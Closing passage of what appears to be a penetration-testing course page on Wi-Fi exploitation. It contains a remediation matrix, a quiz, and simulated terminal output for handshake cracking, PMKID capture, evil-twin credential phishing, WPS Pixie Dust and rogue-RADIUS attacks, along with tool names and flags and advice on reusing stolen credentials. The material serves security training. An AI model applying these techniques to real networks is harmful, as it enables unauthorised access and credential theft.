            <tr><td>PMKID exposed (strong PSK)</td><td>3.1</td><td style="color:var(--accent)">Low</td><td>Chain 2</td><td>Mitigated by strong passphrase</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- Section 6: Remediation -->
    <section id="remediation">
      <h2><span class="section-num">04</span> Remediation Priority Matrix</h2>

      <div class="table-wrap">
        <table>
          <thead>
            <tr><th>Finding</th><th>Severity</th><th>Chains Affected</th><th>Primary Fix</th></tr>
          </thead>
          <tbody>
            <tr><td>WPS enabled</td><td style="color:var(--accent3)">Critical</td><td>Chain 4</td><td>Disable WPS entirely</td></tr>
            <tr><td>Weak WPA2 passphrase</td><td style="color:var(--accent3)">Critical</td><td>Chain 1, 2</td><td>20+ char random passphrase or WPA3</td></tr>
            <tr><td>PEAP without cert validation</td><td style="color:var(--accent3)">Critical</td><td>Chain 5</td><td>Pin RADIUS CA on all supplicants</td></tr>
            <tr><td>WPA3 transition mode</td><td style="color:var(--warn)">High</td><td>Chain 1, 2</td><td>WPA3-only mode</td></tr>
            <tr><td>No 802.11w (MFP)</td><td style="color:var(--warn)">High</td><td>Chain 1, 3</td><td>Enable mandatory MFP</td></tr>
            <tr><td>Open networks present</td><td style="color:var(--warn)">High</td><td>Chain 3</td><td>Eliminate open APs</td></tr>
            <tr><td>No WIPS deployed</td><td style="color:var(--warn)">Medium</td><td>All</td><td>Deploy wireless IDS/IPS</td></tr>
          </tbody>
        </table>
      </div>

      <div class="callout tip">
        <span class="ci">&#128274;</span>
        <div><strong>Single highest-impact fix:</strong> A 20+ character random passphrase defeats Chain 1 and Chain 2 computationally. Migrating to WPA3 defeats all PSK-based chains. Enforcing RADIUS cert validation defeats Chain 5. Combined: these three changes neutralise the entire course.</div>
      </div>
    </section>

    <!-- Section 7: Final Quiz -->
    <section id="quiz">
      <h2><span class="section-num">07</span> Final Course Knowledge Check</h2>
      <p>The capstone quiz covers the full course — decision-making, chain selection, and remediation.</p>

      <div class="quiz-container">
        <h3>&#127358; Final Course Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions — all modules</span></h3>

        <!-- Q1 -->
        <div class="quiz-question" id="q1">
          <div class="q-num">Question 1 of 8</div>
          <div class="q-text">Using the decision tree: a target AP has WPS enabled (Lck=No, version 2.0), WPA2-PSK, and 3 connected clients. Which chain do you run first and why?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q1',false)">Chain 1 — deauth clients and capture the handshake; fastest for PSK recovery</button>
            <button class="option-btn" onclick="answer(this,'q1',true)">Chain 4 — WPS Pixie Dust first; if vulnerable firmware, compromises the network in under 30 seconds. If Pixie Dust fails, fall back to Chain 1 or 2</button>
            <button class="option-btn" onclick="answer(this,'q1',false)">Chain 2 — PMKID capture; no deauth noise and works even without clients</button>
            <button class="option-btn" onclick="answer(this,'q1',false)">Chain 3 — evil twin; captures the PSK directly from clients without cracking</button>
          </div>
          <div class="quiz-feedback" id="fb-q1"></div>
        </div>

        <!-- Q2 -->
        <div class="quiz-question" id="q2">
          <div class="q-num">Question 2 of 8</div>
          <div class="q-text">In Chain 1, why must you convert the airodump-ng <code>.cap</code> file with <code>hcxpcapngtool</code> before running hashcat?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q2',false)">Because hashcat cannot read .cap files — it requires .pcapng format only</button>
            <button class="option-btn" onclick="answer(this,'q2',true)">hashcat -m 22000 requires the .hc22000 format (WPA*01*/WPA*02* lines). hcxpcapngtool extracts PMKID and EAPOL hashes from the raw capture into this format. aircrack-ng can read .cap directly but hashcat cannot</button>
            <button class="option-btn" onclick="answer(this,'q2',false)">Because hcxpcapngtool decrypts the WPA2 frames so hashcat only needs to verify them</button>
            <button class="option-btn" onclick="answer(this,'q2',false)">To strip unnecessary frames and reduce file size for faster cracking</button>
          </div>
          <div class="quiz-feedback" id="fb-q2"></div>
        </div>

        <!-- Q3 -->
        <div class="quiz-question" id="q3">
          <div class="q-num">Question 3 of 8</div>
          <div class="q-text">Chain 3 (Evil Twin + Captive Portal) is the only chain that works when the WPA2 passphrase is truly uncrackable (25+ random chars). Why?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q3',false)">Because it bypasses WPA2 encryption entirely using NAT tunneling</button>
            <button class="option-btn" onclick="answer(this,'q3',true)">Chain 3 never cracks the passphrase — it uses social engineering to trick users into entering their credentials (WPA2 PSK or login credentials) into a fake portal page. It is independent of passphrase strength</button>
            <button class="option-btn" onclick="answer(this,'q3',false)">Because dnsmasq resolves the PSK from cached DNS entries</button>
            <button class="option-btn" onclick="answer(this,'q3',false)">It still requires cracking — but cewl generates a target-specific wordlist that finds even strong passwords</button>
          </div>
          <div class="quiz-feedback" id="fb-q3"></div>
        </div>

        <!-- Q4 -->
        <div class="quiz-question" id="q4">
          <div class="q-num">Question 4 of 8</div>
          <div class="q-text">After Chain 5 captures and cracks MSCHAPv2 for alice@corp.com with password "Summer2024!", what two post-exploitation steps demonstrate maximum business impact in a report?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q4',false)">Scan for more WPS targets on the same channel; set up a second evil twin</button>
            <button class="option-btn" onclick="answer(this,'q4',true)">Test the credentials against SMB shares (smbclient) and RDP/VPN to demonstrate lateral movement, and enumerate accessible internal resources — proving the credential provides access far beyond Wi-Fi</button>
            <button class="option-btn" onclick="answer(this,'q4',false)">Run hashcat on the NT hash to verify the password is correct before reporting</button>
            <button class="option-btn" onclick="answer(this,'q4',false)">Deploy a persistent KARMA AP so the credential can be captured again if changed</button>
          </div>
          <div class="quiz-feedback" id="fb-q4"></div>
        </div>

        <!-- Q5 -->
        <div class="quiz-question" id="q5">
          <div class="q-num">Question 5 of 8</div>
          <div class="q-text">The auto_attack.sh script checks WPS before attempting handshake capture. What is the logic behind this prioritization?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q5',false)">WPS is checked first because it requires fewer tools and less network access</button>
            <button class="option-btn" onclick="answer(this,'q5',true)">A successful Pixie Dust attack takes under 30 seconds and reveals the actual WPA2 passphrase (not just a handshake hash to crack). If WPS is available, it's the fastest path. Only if WPS is disabled or locked does the script fall back to the slower handshake capture workflow</button>
            <button class="option-btn" onclick="answer(this,'q5',false)">WPS is checked because it bypasses 802.11w (PMF) which would otherwise block deauth</button>
            <button class="option-btn" onclick="answer(this,'q5',false)">WPS is the most reliable method because it works on all WPA2 networks regardless of client activity</button>
          </div>
          <div class="quiz-feedback" id="fb-q5"></div>
        </div>

        <!-- Q6 -->
        <div class="quiz-question" id="q6">
          <div class="q-num">Question 6 of 8</div>
          <div class="q-text">What single remediation from the priority matrix would neutralize Chain 1, Chain 2, and significantly reduce Chain 3's effectiveness?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q6',false)">Enable 802.11w (MFP) to block deauthentication attacks</button>
            <button class="option-btn" onclick="answer(this,'q6',false)">Disable WPS on all access points</button>
            <button class="option-btn" onclick="answer(this,'q6',true)">Migrate to WPA3-SAE: eliminates offline dictionary attacks (Chain 1/2 become computationally infeasible), and for Chain 3 — if clients are configured to only trust WPA3 with PMF, the evil twin must match or they won't connect</button>
            <button class="option-btn" onclick="answer(this,'q6',false)">Deploy a WIDS to detect and alert on deauth floods and beacon anomalies</button>
          </div>
          <div class="quiz-feedback" id="fb-q6"></div>
        </div>

        <!-- Q7 -->
        <div class="quiz-question" id="q7">
          <div class="q-num">Question 7 of 8</div>
          <div class="q-text">In Chain 2, after capturing PMKIDs with hcxdumptool, the hash file shows 0 lines after conversion. What is the most likely cause?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q7',false)">The APs use WPA3-SAE which does not include PMKIDs</button>
            <button class="option-btn" onclick="answer(this,'q7',false)">hashcat doesn't support -m 22000 on this version — use -m 2500 instead</button>
            <button class="option-btn" onclick="answer(this,'q7',true)">hcxdumptool ran with --enable_status missing (v6+) and captured nothing, OR no APs responded to association requests during the capture window. Try --active_beacon and longer capture duration, or verify hcxdumptool version flags</button>
            <button class="option-btn" onclick="answer(this,'q7',false)">The NetworkManager was stopped too early — restart it and run hcxdumptool again</button>
          </div>
          <div class="quiz-feedback" id="fb-q7"></div>
        </div>

        <!-- Q8 -->
        <div class="quiz-question" id="q8">
          <div class="q-num">Question 8 of 8</div>
          <div class="q-text">A pentest report shows "PMKID exposed" with CVSS 3.1 (Low) for a network using a 25-character random passphrase. Is this correct, and why?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q8',false)">No — PMKID exposure is always Critical because it enables offline cracking of any WPA2 network</button>
            <button class="option-btn" onclick="answer(this,'q8',true)">Yes — PMKID exposure is only dangerous if the passphrase is weak enough to crack. A 25-char random passphrase has ~120 bits of entropy; at 1.2M H/s it would take longer than the age of the universe. The finding is informational/low — the real fix (WPA3) is a best practice, not a critical gap</button>
            <button class="option-btn" onclick="answer(this,'q8',false)">No — PMKID attacks are passive; any severity above Informational is incorrect</button>
            <button class="option-btn" onclick="answer(this,'q8',false)">No — PMKID only works on WPA2, so WPA3 transition mode APs should be Critical</button>
          </div>
          <div class="quiz-feedback" id="fb-q8"></div>
        </div>

        <div class="quiz-score" id="quizScore">
          <div class="score-num" id="scoreNum">0/8</div>
          <div class="score-label" id="scoreLabel"></div>
        </div>
      </div>
    </section>

    <!-- Completion Banner -->
    <div class="completion-banner">
      <h2>Course Complete</h2>
      <div class="completion-badge">&#127881; Wireless Network Exploitation — All 15 Modules</div>
      <p>You have covered every major Wi-Fi attack from 802.11 fundamentals through WPA3-Enterprise. Use these skills exclusively for authorized penetration testing and security research.</p>
    </div>

    <div class="nav-footer">
      <a href="../module-13-enterprise-wpa/" class="nav-btn prev">&#8592; Module 13: WPA-Enterprise</a>
      <a href="../" class="nav-btn home">&#8962; Course Home</a>
    </div>
  </main>
</div>

<script>
  // ── Quiz ──────────────────────────────────────────────────────
  const TOTAL_Q = 8;
  const qAnswered = {};
  const qFeedbacks = {
    q1: {
      correct: "Correct. The decision tree always checks WPS first because Pixie Dust is the fastest possible attack — a single WPS exchange (M1-M3) and offline computation yields the full WPA2 passphrase in seconds. No wordlist, no GPU, no clients needed. Chain 1 (handshake) and Chain 2 (PMKID) both still require cracking and can take hours.",
      wrong: "Incorrect. The decision tree prioritizes WPS (Chain 4) because Pixie Dust is the fastest possible attack — under 30 seconds for the full PSK on vulnerable firmware. No cracking required. Chain 1 requires deauth and handshake capture. Chain 2 is clientless but still needs cracking. Always check WPS first."
    },
    q2: {
      correct: "Correct. hashcat's -m 22000 mode reads a specific text format: 'WPA*01*...' (PMKID) or 'WPA*02*...' (EAPOL) lines. airodump-ng .cap files are raw pcap — hashcat cannot parse them directly. hcxpcapngtool extracts and formats the relevant cryptographic values into the .hc22000 format hashcat expects. aircrack-ng does read .cap directly, but is much slower than GPU hashcat.",
      wrong: "Incorrect. hashcat -m 22000 requires the specific .hc22000 text format (WPA*01*/WPA*02* lines). airodump-ng .cap files are raw PCAP. hcxpcapngtool extracts the cryptographic values (PMKID, nonces, MIC) from the PCAP and formats them for hashcat. This conversion step is mandatory for GPU cracking."
    },
    q3: {
      correct: "Correct. Chain 3 is purely social engineering — it does not crack the passphrase at all. The evil twin + captive portal tricks the user into voluntarily typing their password into what appears to be a legitimate Wi-Fi reconnect page. Passphrase complexity is irrelevant because the user provides it directly. A 50-character random passphrase is equally vulnerable if the user enters it.",
      wrong: "Incorrect. Chain 3 (Evil Twin + Captive Portal) doesn't crack anything. It tricks the user into entering their password into a fake portal. The passphrase is provided voluntarily by the victim — length and complexity don't matter. This is why social engineering is often the most effective attack regardless of cryptographic strength."
    },
    q4: {
      correct: "Correct. Wi-Fi access alone is one finding. Demonstrating that the same AD credentials work against SMB shares (smbclient), RDP, or VPN dramatically increases the business risk rating from Medium to Critical. The report shows: 'one captured hash grants access to email, file shares, and remote desktop across the corporate network.' This is the operational multiplier of enterprise wireless attacks.",
      wrong: "Incorrect. The high-impact evidence for a Chain 5 finding is demonstrating that cracked AD credentials work beyond Wi-Fi — specifically SMB share enumeration, VPN authentication, and RDP access. This proves the credential is valid across the corporate network, justifying a Critical rating rather than just a High for wireless access alone."
    },
    q5: {
      correct: "Correct. WPS Pixie Dust is the fastest attack in the toolkit — under 30 seconds for a successful exploit, revealing the actual WPA2 passphrase directly. Handshake capture (Chain 1) requires deauthing clients, waiting for reconnection, and potentially hours of cracking. PMKID (Chain 2) is clientless but still needs hours of GPU cracking. Speed and stealth both favor WPS first.",
      wrong: "Incorrect. The script prioritizes WPS because Pixie Dust can compromise the network in under 30 seconds, yielding the literal passphrase without any cracking. Handshake and PMKID attacks both require dictionary/brute-force cracking which can take hours or fail entirely on strong passwords. If WPS is available and unlocked, it's always the first choice."
    },
    q6: {
      correct: "Correct. WPA3-SAE (Dragonfly) replaces PSK with an interactive key exchange that cannot be attacked offline — eliminating Chain 1 and Chain 2. For Chain 3 (evil twin), clients configured for WPA3-only will refuse to connect to WPA2-only evil twins, reducing the attack surface. WPA3 mandates PMF, which also hardens against deauth-based Chain 3 techniques.",
      wrong: "Incorrect. WPA3-SAE is the highest-impact single fix. It eliminates offline dictionary attacks entirely (defeating Chain 1 and Chain 2), mandates PMF (hardening Chain 3), and introduces forward secrecy. Disabling WPS only fixes Chain 4. 802.11w only hardens deauth. WIDS only detects — it doesn't prevent."
    },
    q7: {
      correct: "Correct. hcxdumptool v6+ silently exits without output if --enable_status=1 (or higher) is missing. Without status output, the tool may appear to run but capture nothing. Also: if no APs are visible or none respond to association requests during the capture window, the pcapng file exists but contains no PMKID data. Check the hcxdumptool version and use --enable_status=1.",
      wrong: "Incorrect. The most likely cause of 0 hashes is hcxdumptool v6+ running without --enable_status=1 (which causes silent no-output behavior) OR no APs responding during the capture window. WPA3-SAE networks don't produce crackable PMKIDs but they don't cause 0 hashes for all networks. The conversion tool handles format automatically."
    },
    q8: {
      correct: "Correct. CVSS 3.1 (Low) is appropriate for PMKID exposure when the passphrase is genuinely strong. PMKID is a protocol feature that cannot be disabled — but with a 25-char random passphrase, offline cracking is computationally infeasible (~10^35 years at 1.2M H/s). The finding is informational/best-practice. If the passphrase were weak, the same finding would be Critical.",
      wrong: "Incorrect. PMKID exposure severity depends entirely on passphrase strength. With a 25-character random passphrase (~120 bits entropy), cracking is computationally infeasible regardless of GPU speed. The finding is Low/Informational. The same finding against a network with 'password123' would be Critical. Context and exploitability determine CVSS."
    }
  };

  let qScore = 0;
  let qCount = 0;

  function answer(btn, qId, isCorrect) {
    if (qAnswered[qId]) return;
    qAnswered[qId] = true;
    qCount++;
    const qEl = document.getElementById(qId);
    const buttons = qEl.querySelectorAll('.option-btn');
    buttons.forEach(b => b.disabled = true);
    const fb = document.getElementById('fb-' + qId);
    if (isCorrect) {
      btn.classList.add('correct');
      qScore++;
      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
      fb.className = 'quiz-feedback correct-fb show';
    } else {
      btn.classList.add('wrong');
      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
      fb.className = 'quiz-feedback wrong-fb show';
      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
    }
    if (qCount === TOTAL_Q) {
      const scoreEl = document.getElementById('quizScore');
      const numEl = document.getElementById('scoreNum');
      const labelEl = document.getElementById('scoreLabel');
      numEl.textContent = qScore + '/' + TOTAL_Q;
      const pct = qScore / TOTAL_Q;
      if (pct === 1) {
        labelEl.textContent = 'Perfect score — you have mastered wireless network exploitation. Congratulations!';
        numEl.style.color = 'var(--accent2)';
      } else if (pct >= 0.75) {
        labelEl.textContent = 'Strong performance — review the missed questions and their explanations.';
        numEl.style.color = 'var(--warn)';
      } else if (pct >= 0.5) {
        labelEl.textContent = 'Getting there — revisit the chain decision tree, PMKID, and post-exploitation sections.';
        numEl.style.color = 'var(--warn)';
      } else {
        labelEl.textContent = 'Re-read the attack selection, chain scripts, and remediation matrix sections.';
        numEl.style.color = 'var(--accent3)';
      }
      scoreEl.classList.add('show');
    }
  }

  function copyTerm(btn, id) {
    const el = document.getElementById(id);
    navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
      btn.textContent = 'Copied!'; btn.classList.add('copied');
      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
    });
  }

  function selectChain(n) {
    document.querySelectorAll('.chain-card').forEach((c,i) => {
      c.classList.toggle('selected', i === n-1);
    });
    document.getElementById('chainSelect').value = String(n);
  }

  let simRunning = false;

  const CHAINS = {
    1: {
      label: 'Deauth + Handshake + Crack',
      steps: [
        [0,   `<span style="color:var(--accent2)">[*]</span> Starting monitor mode on wlan0...`],
        [600, `<span style="color:var(--accent2)">[✓]</span> wlan0mon enabled`],
        [1000,`<span style="color:var(--accent2)">[*]</span> Locking to channel 6, capturing...`],
        [1800,`<span style="color:var(--text-dim)">[..]</span> Monitoring {ssid} — waiting for clients`],
        [2600,`<span style="color:var(--accent3)">[+]</span> Client 11:22:33:44:55:66 detected`],
        [3200,`<span style="color:var(--accent2)">[*]</span> Sending 10 deauth frames...`],
        [3800,`<span style="color:var(--accent2)">[+]</span> WPA handshake: AA:BB:CC:DD:EE:FF`],
        [4400,`<span style="color:var(--accent2)">[*]</span> Converting to hashcat format...`],
        [5000,`<span style="color:var(--accent2)">[*]</span> hashcat -m 22000 — dictionary + best64 rules`],
        [6000,`<span style="color:var(--text-dim)">[..]</span> Trying: password, 123456, letmein...`],
        [7500,`<span style="color:var(--text-dim)">[..]</span> Trying: Summer2024, Welcome1, {ssid}123...`],
        [9000,`<span style="color:var(--accent2)">[CRACKED]</span> {ssid} → <span style="color:var(--accent2);font-weight:700">Summer2024!</span>`],
      ],
      result: [['SSID','{ssid}'],['Passphrase','Summer2024!'],['Method','EAPOL handshake + hashcat -m 22000']]
    },
    2: {
      label: 'PMKID Clientless',
      steps: [
        [0,   `<span style="color:var(--accent2)">[*]</span> Stopping NetworkManager...`],
        [500, `<span style="color:var(--accent2)">[*]</span> hcxdumptool capturing PMKIDs...`],
        [1200,`<span style="color:var(--accent2)">[001]</span> AA:BB:CC:DD:EE:FF <span style="color:var(--accent2)">[FOUND PMKID]</span> {ssid}`],
        [1800,`<span style="color:var(--accent2)">[002]</span> 11:22:33:44:55:66 <span style="color:var(--accent2)">[FOUND PMKID]</span> NeighborNet`],
        [2500,`<span style="color:var(--accent2)">[*]</span> Converting to hc22000 format...`],
        [3000,`<span style="color:var(--text-dim)">networks with PMKID: 2`],
        [3500,`<span style="color:var(--accent2)">[*]</span> hashcat -m 22000 — rule attack`],
        [5000,`<span style="color:var(--text-dim)">[..]</span> Trying: password123, Winter2023!, {ssid}...`],
        [7000,`<span style="color:var(--accent2)">[CRACKED]</span> {ssid} → <span style="color:var(--accent2);font-weight:700">P@ssw0rd2024</span>`],
      ],
      result: [['SSID','{ssid}'],['Passphrase','P@ssw0rd2024'],['Method','PMKID capture — no clients needed']]
    },
    3: {
      label: 'Evil Twin + Portal',
      steps: [
        [0,   `<span style="color:var(--accent2)">[*]</span> Starting hostapd evil twin: {ssid} CH6`],
        [700, `<span style="color:var(--accent2)">[✓]</span> wlan1: AP-ENABLED`],
        [1200,`<span style="color:var(--accent2)">[*]</span> dnsmasq wildcard DNS active → 10.0.0.1`],
        [1700,`<span style="color:var(--accent2)">[*]</span> nginx captive portal listening :80`],
        [2200,`<span style="color:var(--accent3)">[*]</span> Deauthing real AP — pushing clients to evil twin`],
        [3000,`<span style="color:var(--accent3)">[+]</span> Client 10.0.0.12 connected to evil twin`],
        [3800,`<span style="color:var(--accent3)">[+]</span> Client 10.0.0.12 opened portal page`],
        [4600,`<span style="color:var(--accent2)">[CAPTURED]</span> IP=10.0.0.12 USER=alice@corp.com PASS=CoffeeShop1`],
        [5400,`<span style="color:var(--accent3)">[+]</span> Client 10.0.0.23 connected`],
        [6200,`<span style="color:var(--accent2)">[CAPTURED]</span> IP=10.0.0.23 USER=bob.smith PASS=Welcome1!`],
      ],
      result: [['Credentials','alice@corp.com : CoffeeShop1'],['','bob.smith : Welcome1!'],['Method','Evil Twin + DNS hijack + captive portal']]
    },
    4: {
      label: 'WPS Pixie Dust',
      steps: [
        [0,   `<span style="color:var(--accent2)">[*]</span> Scanning for WPS targets (wash)...`],
        [800, `<span style="color:var(--accent2)">[+]</span> AA:BB:CC:DD:EE:FF CH6 WPS2.0 Lck:No — {ssid}`],
        [1400,`<span style="color:var(--accent2)">[*]</span> reaver -K 1 — Pixie Dust mode`],
        [2000,`<span style="color:var(--text-dim)">[+]</span> Associated with AA:BB:CC:DD:EE:FF`],
        [2600,`<span style="color:var(--accent)">[+]</span> Received M1 — E-Nonce captured`],
        [3000,`<span style="color:var(--accent)">[+]</span> Received M3 — E-Hash1/E-Hash2 captured`],
        [3500,`<span style="color:var(--warn)">[Pixie-Dust]</span> Weak PRNG detected: E-S1 = 0x000...`],
        [4000,`<span style="color:var(--warn)">[Pixie-Dust]</span> Computing PIN offline...`],
        [4600,`<span style="color:var(--accent2)">[Pixie-Dust]</span> WPS PIN: 12345678`],
        [5000,`<span style="color:var(--accent2)">[+]</span> WPA PSK: <span style="font-weight:700">Str0ngP@ss!</span>`],
        [5200,`<span style="color:var(--text-dim)">[*]</span> Time taken: 0h 0m 4s`],
      ],
      result: [['SSID','{ssid}'],['WPS PIN','12345678'],['WPA PSK','Str0ngP@ss!'],['Time','4 seconds']]
    },
    5: {
      label: 'Enterprise Rogue RADIUS',
      steps: [
        [0,   `<span style="color:var(--accent2)">[*]</span> Generating self-signed RADIUS certs...`],
        [700, `<span style="color:var(--accent2)">[*]</span> hostapd-wpe: {ssid} WPA2-Enterprise CH6`],
        [1200,`<span style="color:var(--accent2)">[✓]</span> Rogue RADIUS server active`],
        [2000,`<span style="color:var(--accent3)">[+]</span> Client alice@corp.com connecting...`],
        [2700,`<span style="color:var(--text-dim)">[..]</span> TLS handshake — client accepted self-signed cert`],
        [3300,`<span style="color:var(--accent2)">[CAPTURED]</span> MSCHAPv2: alice@corp.com`],
        [3800,`<span style="color:var(--warn)">    challenge: 5d:9b:4b:1f:3a:2e:7c:8d`],
        [4100,`<span style="color:var(--accent3)">    response:  a1:b2:c3:d4:e5:f6:a7:b8...`],
        [4800,`<span style="color:var(--accent2)">[*]</span> asleap cracking MSCHAPv2...`],
        [5800,`<span style="color:var(--accent2)">[CRACKED]</span> alice@corp.com → <span style="color:var(--accent2);font-weight:700">Summer2024!</span>`],
        [6200,`<span style="color:var(--text-dim)">[*]</span> AD credentials valid for email, VPN, SharePoint`],
      ],
      result: [['User','alice@corp.com'],['Password','Summer2024!'],['Scope','Active Directory — email, VPN, intranet'],['Method','Rogue RADIUS PEAP-MSCHAPv2 capture + asleap']]
    }
  };

  function runChain() {
    if (simRunning) return;
    simRunning = true;

    const chainNum = parseInt(document.getElementById('chainSelect').value);
    const ssid     = document.getElementById('simSSID').value || 'TargetNetwork';
    const chain    = CHAINS[chainNum];
    const output   = document.getElementById('chainOutput');
    const prog     = document.getElementById('simProg');
    const fill     = document.getElementById('progFill');
    const pct      = document.getElementById('progPct');
    const label    = document.getElementById('progLabel');
    const resultBox= document.getElementById('resultBox');
    const btn      = document.getElementById('simBtn');

    output.innerHTML = '';
    resultBox.classList.remove('show');
    prog.classList.add('show');
    fill.style.width = '0%'; pct.textContent = '0%';
    label.textContent = chain.label;
    btn.disabled = true;

    const sub = (s) => s.replace(/\{ssid\}/g, ssid);

    const totalDuration = chain.steps[chain.steps.length - 1][0] + 1200;

    chain.steps.forEach(([delay, msg]) => {
      setTimeout(() => {
        output.innerHTML += sub(msg) + '\n';
        output.scrollTop = output.scrollHeight;
        const p = Math.round((delay / totalDuration) * 90);
        fill.style.width = p + '%'; pct.textContent = p + '%';
      }, delay);
    });

    setTimeout(() => {
      fill.style.width = '100%'; pct.textContent = '100%';
      document.getElementById('resultItems').innerHTML =
        chain.result.map(([k,v]) =>
          `<div class="rb-item"><span class="rb-key">${k ? k+': ' : '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'}</span><span class="rb-val">${sub(v)}</span></div>`
        ).join('');
      resultBox.classList.add('show');
      simRunning = false; btn.disabled = false;
    }, totalDuration);
  }
</script>
</body>
</html>
